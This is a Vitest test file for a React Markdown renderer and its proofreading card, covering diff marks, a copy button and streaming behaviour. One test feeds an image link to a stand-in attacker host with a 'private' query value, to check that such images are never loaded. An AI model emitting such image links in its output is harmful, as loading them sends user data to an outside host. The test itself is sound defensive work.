import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import { Markdown, ProofreadContext } from '../Markdown'

describe('Markdown', () => {
  it('shows a picture’s description and never loads its address', () => {
    const html = renderToStaticMarkup(<Markdown text="Look: ![a chart](https://evil.com/p.png?d=private)" />)
    expect(html).toContain('a chart')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('evil.com')
  })
})

describe('the proofread card', () => {
  const answer = '```fixed\nShe went home.\n```\n\n- A reason.'
  const render = (source: string, done = true) =>
    renderToStaticMarkup(
      <ProofreadContext.Provider value={{ source, done }}>
        <Markdown text={answer} />
      </ProofreadContext.Provider>
    )

  it('marks what changed against the highlighted text', () => {
    const html = render('She go home.')
    expect(html).toContain('<del>go</del>')
    expect(html).toContain('<ins>went</ins>')
    expect(html).toContain('Copy fixed text')
    expect(html).toContain('A reason.')
  })

  it('shows plain text until the answer finishes', () => {
    const html = render('She go home.', false)
    expect(html).toContain('She went home.')
    expect(html).not.toContain('<del>')
    expect(html).not.toContain('Copy fixed text')
  })

  it('still shows the fixed text with nothing to compare', () => {
    expect(render('')).toContain('She went home.')
  })

  it('leaves other code blocks alone', () => {
    expect(renderToStaticMarkup(<Markdown text={'```js\nlet a\n```'} />)).toContain('<pre>')
  })
})
